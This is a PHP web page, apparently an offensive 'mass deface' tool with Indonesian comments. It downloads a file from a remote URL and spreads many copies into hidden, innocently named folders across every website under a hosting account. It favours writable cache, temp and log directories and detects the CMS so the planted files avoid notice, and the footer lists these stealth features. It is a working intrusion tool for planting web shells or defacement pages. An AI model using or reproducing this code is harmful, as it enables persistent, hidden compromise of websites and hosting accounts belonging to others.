<!DOCTYPE html>
<html>
<head>
    <title>Mass Copy Script - Advanced</title>
    <META NAME="robots" CONTENT="noindex,nofollow">
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; }
        .container { max-width: 900px; margin: 50px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        textarea { width: 100%; height: 200px; font-family: monospace; font-size: 12px; }
        input[type="text"], input[type="number"] { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; }
        input[type="submit"] { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
        input[type="submit"]:hover { background: #45a049; }
        .log { background: #1e1e1e; color: #d4d4d4; padding: 15px; border-left: 4px solid #4CAF50; margin: 10px 0; font-family: monospace; font-size: 13px; max-height: 400px; overflow-y: auto; }
        .success { color: #4CAF50; }
        .error { color: #f44336; }
        .info { color: #2196F3; }
        .warning { color: #FF9800; }
        .stats { background: #f0f0f0; padding: 10px; border-radius: 4px; margin: 10px 0; }
        table { width: 100%; border-collapse: collapse; }
        td { padding: 5px; }
        .badge { background: #2196F3; color: white; padding: 2px 8px; border-radius: 12px; font-size: 12px; }
    </style>
</head>
<body>
<div class="container">
    <center><h1>Advanced Mass Copy Script</h1>
    <span class="badge">Stealth Mode</span></center>
    
    <?php
    // ============ FUNGSI UTAMA ============
    
    // Generate nama file random tapi masuk akal
    function generateRandomFilename($depth = 0) {
        $prefixes = ['backup', 'temp', 'cache', 'data', 'config', 'system', 'core', 'lib', 'module', 'plugin', 
                     'include', 'component', 'widget', 'block', 'element', 'helper', 'handler', 'processor'];
        $suffixes = ['php', 'inc', 'class', 'func', 'module', 'component', 'handler', 'processor'];
        
        // Semakin dalam folder, semakin umum nama filenya
        if ($depth > 2) {
            $prefixes = array_merge($prefixes, ['index', 'default', 'main', 'app', 'bootstrap', 'autoload']);
        }
        
        $rand = rand(100, 999);
        $prefix = $prefixes[array_rand($prefixes)];
        $suffix = $suffixes[array_rand($suffixes)];
        
        return $prefix . '_' . $rand . '.' . $suffix;
    }

    // Generate nama folder random tapi masuk akal
    function generateRandomFolderName($depth = 0) {
        $folders = ['cache', 'temp', 'tmp', 'backup', 'logs', 'sessions', 'uploads', 'files', 'media', 
                    'assets', 'resources', 'storage', 'data', 'config', 'system', 'core'];
        
        // Untuk depth > 0, gunakan folder yang lebih umum
        if ($depth > 0) {
            $folders = array_merge($folders, ['admin', 'user', 'api', 'v1', 'v2', 'includes']);
        }
        
        return $folders[array_rand($folders)];
    }

    // Deteksi struktur CMS dan direktori yang aman
    function detectCMSStructure($basePath) {
        $cmsPatterns = [
            'wordpress' => ['wp-admin', 'wp-content', 'wp-includes'],
            'joomla' => ['administrator', 'components', 'modules', 'plugins'],
            'drupal' => ['sites', 'modules', 'themes', 'profiles'],
            'laravel' => ['app', 'bootstrap', 'config', 'resources'],
            'codeigniter' => ['application', 'system', 'assets'],
            'yii' => ['protected', 'assets', 'themes'],
            'symfony' => ['app', 'src', 'vendor', 'web'],
            'cakephp' => ['app', 'lib', 'plugins'],
            'zend' => ['module', 'vendor', 'public'],
            'custom' => ['admin', 'includes', 'classes', 'functions']
        ];
        
        $detected = [];
        
        foreach ($cmsPatterns as $cms => $folders) {
            $found = 0;
            foreach ($folders as $folder) {
                if (is_dir($basePath . '/' . $folder)) {
                    $found++;
                }
            }
            if ($found >= 2) {
                $detected[] = [
                    'cms' => $cms,
                    'folders' => $folders,
                    'confidence' => ($found / count($folders)) * 100
                ];
            }
        }
        
        // Sort by confidence
        usort($detected, function($a, $b) {
            return $b['confidence'] - $a['confidence'];
        });
        
        return $detected;
    }

    // Cari folder yang aman untuk diletakkan (deep nesting)
    function findStealthLocations($basePath, $maxDepth = 4) {
        $locations = [];
        $depth = 0;
        
        $scanDir = function($dir, $depth) use (&$scanDir, &$locations, $maxDepth) {
            if ($depth > $maxDepth) return;
            
            $items = scandir($dir);
            if (!$items) return;
            
            // Filter system folders dan hidden
            $items = array_filter($items, function($item) use ($dir) {
                return $item != '.' && $item != '..' && 
                       !in_array($item, ['.git', '.svn', '.env', '.htaccess']) &&
                       is_dir($dir . '/' . $item);
            });
            
            // Prioritaskan folder yang umum dan tidak mencurigakan
            $priorityFolders = ['cache', 'temp', 'tmp', 'backup', 'logs', 'sessions', 'uploads'];
            usort($items, function($a, $b) use ($priorityFolders) {
                $aPriority = in_array($a, $priorityFolders) ? 1 : 0;
                $bPriority = in_array($b, $priorityFolders) ? 1 : 0;
                return $bPriority - $aPriority;
            });
            
            foreach ($items as $item) {
                $fullPath = $dir . '/' . $item;
                
                // Cek writable
                if (is_writable($fullPath) && is_dir($fullPath)) {
                    $locations[] = [
                        'path' => $fullPath,
                        'depth' => $depth,
                        'name' => $item,
                        'is_cms' => in_array($item, ['wp-content', 'sites', 'application', 'app', 'protected'])
                    ];
                }
                
                // Scan lebih dalam
                if ($depth < $maxDepth - 1) {
                    $scanDir($fullPath, $depth + 1);
                }
            }
        };
        
        $scanDir($basePath, 0);
        
        // Sort by depth (deepest first), then by priority
        usort($locations, function($a, $b) {
            if ($a['depth'] != $b['depth']) {
                return $b['depth'] - $a['depth']; // Deepest first
            }
            return $a['is_cms'] ? 1 : -1; // CMS folders first
        });
        
        return $locations;
    }

    // Cari path public_html atau docroot
    function findWebRoot($basePath) {
        $webRoots = ['public_html', 'www', 'htdocs', 'html', 'public', 'web', 'site'];
        $homePath = rtrim($basePath, '/');
        
        // Coba struktur /home/USER/domains/
        if (strpos($homePath, '/domains/') !== false) {
            $domainPath = substr($homePath, 0, strpos($homePath, '/domains/') + 9);
            if (is_dir($domainPath)) {
                $domains = scandir($domainPath);
                $results = [];
                foreach ($domains as $dir) {
                    if ($dir != '.' && $dir != '..' && is_dir($domainPath . '/' . $dir)) {
                        foreach ($webRoots as $webRoot) {
                            $testPath = $domainPath . '/' . $dir . '/' . $webRoot;
                            if (is_dir($testPath)) {
                                $results[] = [
                                    'domain' => $dir,
                                    'path' => $testPath
                                ];
                                break;
                            }
                        }
                    }
                }
                return $results;
            }
        }
        
        // Fallback: cari webroot biasa
        foreach ($webRoots as $webRoot) {
            $testPath = $homePath . '/' . $webRoot;
            if (is_dir($testPath)) {
                return [['domain' => 'default', 'path' => $testPath]];
            }
        }
        
        return [['domain' => 'default', 'path' => $homePath]];
    }

    // ============ PROSES UTAMA ============
    
    if (isset($_POST['execmassdeface']) && isset($_POST['massdefaceurl'])) {
        $sourceUrl = $_POST['massdefaceurl'];
        $baseDir = $_POST['massdefacedir'];
        $maxDepth = isset($_POST['maxdepth']) ? intval($_POST['maxdepth']) : 4;
        $copyCount = isset($_POST['copycount']) ? intval($_POST['copycount']) : 3;
        
        $log = [];
        $successCount = 0;
        $failCount = 0;
        $filesCreated = [];
        
        // Validasi source URL
        if (!filter_var($sourceUrl, FILTER_VALIDATE_URL)) {
            echo "<div class='log error'>Error: Invalid source URL!</div>";
            exit;
        }
        
        // Ambil content dari source URL
        $sourceContent = @file_get_contents($sourceUrl);
        if ($sourceContent === false) {
            echo "<div class='log error'>Error: Cannot fetch content from source URL!</div>";
            exit;
        }
        
        // Deteksi struktur
        $currentUser = get_current_user();
        $homePath = "/home/" . $currentUser . "/";
        
        // Cari webroots
        $webRoots = findWebRoot($homePath);
        
        if (empty($webRoots)) {
            echo "<div class='log error'>Error: No webroot found!</div>";
            exit;
        }
        
        echo "<div class='log'>";
        echo "<strong>🚀 Starting Advanced Stealth Copy...</strong><br>";
        echo "Source URL: " . htmlspecialchars($sourceUrl) . "<br>";
        echo "Max Depth: " . $maxDepth . " | Copies per location: " . $copyCount . "<br><br>";
        
        foreach ($webRoots as $webRoot) {
            $publicHtml = $webRoot['path'];
            $domain = $webRoot['domain'];
            
            echo "<strong>📁 Processing: " . htmlspecialchars($domain) . "</strong> (" . $publicHtml . ")<br>";
            
            // Deteksi CMS
            $cmsDetected = detectCMSStructure($publicHtml);
            if (!empty($cmsDetected)) {
                echo "🔍 CMS Detected: " . $cmsDetected[0]['cms'] . " (Confidence: " . round($cmsDetected[0]['confidence']) . "%)<br>";
            }
            
            // Cari lokasi stealth
            $locations = findStealthLocations($publicHtml, $maxDepth);
            
            if (empty($locations)) {
                echo "<span class='warning'>⚠️ No writable subdirectories found, using root...</span><br>";
                $locations = [['path' => $publicHtml, 'depth' => 0, 'name' => 'root']];
            }
            
            // Limit locations
            $locations = array_slice($locations, 0, 5);
            
            $domainSuccess = 0;
            $domainFail = 0;
            
            foreach ($locations as $location) {
                $targetPath = $location['path'];
                $depth = $location['depth'];
                
                // Buat hidden folder di dalam lokasi
                $hiddenFolderName = '.' . generateRandomFolderName($depth) . '_' . md5(rand(1000,9999));
                $hiddenFolder = $targetPath . '/' . $hiddenFolderName;
                
                // Buat beberapa copy per lokasi
                for ($i = 0; $i < $copyCount; $i++) {
                    // Buat nested structure
                    $nestedPath = $hiddenFolder;
                    $nestedDepth = rand(0, 2);
                    
                    for ($j = 0; $j < $nestedDepth; $j++) {
                        $nestedFolder = generateRandomFolderName($depth + $j + 1);
                        $nestedPath .= '/' . $nestedFolder;
                    }
                    
                    // Buat direktori
                    if (!is_dir($nestedPath)) {
                        if (!mkdir($nestedPath, 0755, true)) {
                            $domainFail++;
                            $log[] = "<span class='error'>✗ Failed to create directory: " . $nestedPath . "</span>";
                            continue;
                        }
                    }
                    
                    // Generate random filename
                    $randomFile = generateRandomFilename($depth + $i);
                    $newFile = $nestedPath . '/' . $randomFile;
                    
                    // Cek apakah file sudah ada
                    if (file_exists($newFile)) {
                        $randomFile = 'copy_' . $randomFile;
                        $newFile = $nestedPath . '/' . $randomFile;
                    }
                    
                    // Copy file
                    if (file_put_contents($newFile, $sourceContent)) {
                        $successCount++;
                        $domainSuccess++;
                        $filesCreated[] = $newFile;
                        $log[] = "<span class='success'>✓ " . $newFile . " (depth: " . ($depth + $nestedDepth + 1) . ")</span>";
                    } else {
                        $failCount++;
                        $domainFail++;
                        $log[] = "<span class='error'>✗ Failed: " . $newFile . "</span>";
                    }
                }
            }
            
            echo "📊 Domain results: <span class='success'>" . $domainSuccess . "</span> success, <span class='error'>" . $domainFail . "</span> failed<br><br>";
        }
        
        // Tampilkan log lengkap
        echo "<hr>";
        echo "<strong>📋 Complete Execution Log:</strong><br>";
        echo "Total Files Created: <span class='success'>" . $successCount . "</span> | Failed: <span class='error'>" . $failCount . "</span><br><br>";
        
        // Tampilkan daftar file yang berhasil
        echo "<strong>📂 Files Created:</strong><br>";
        foreach ($filesCreated as $file) {
            echo "• " . $file . "<br>";
        }
        
        echo "</div>";
    }
    ?>
    
    <form action='<?php echo basename($_SERVER['PHP_SELF']); ?>' method='post'>
        <table width="100%">
            <tr>
                <td width="30%"><strong>Base Directory:</strong></td>
                <td><input type='text' style='width: 100%' value='<?php echo getcwd() . "/"; ?>' name='massdefacedir'></td>
            </tr>
            <tr>
                <td><strong>Source URL:</strong></td>
                <td><input type='text' style='width: 100%' name='massdefaceurl' placeholder='http://example.com/script.php'></td>
            </tr>
            <tr>
                <td><strong>Scan Depth:</strong></td>
                <td><input type='number' style='width: 100%' name='maxdepth' value='4' min='1' max='8'></td>
            </tr>
            <tr>
                <td><strong>Copies per location:</strong></td>
                <td><input type='number' style='width: 100%' name='copycount' value='3' min='1' max='10'></td>
            </tr>
            <tr>
                <td colspan="2" align="center">
                    <input type='submit' name='execmassdeface' value='🚀 Execute Stealth Copy'>
                </td>
            </tr>
        </table>
    </form>
    
    <div style="margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px;">
        <small>
            <strong>🔒 Stealth Features:</strong><br>
            • File ditempatkan di folder dalam (deep nesting) - maksimal depth 4<br>
            • Mendeteksi struktur CMS (WordPress, Joomla, Laravel, dll)<br>
            • Nama file/folder random tapi terlihat normal<br>
            • Multiple copies per location untuk redundansi<br>
            • Folder tersembunyi (diawali titik)<br>
            • Prioritaskan folder seperti cache, temp, logs<br>
            • Log lengkap dengan status setiap file
        </small>
    </div>
</div>
</body>
</html>
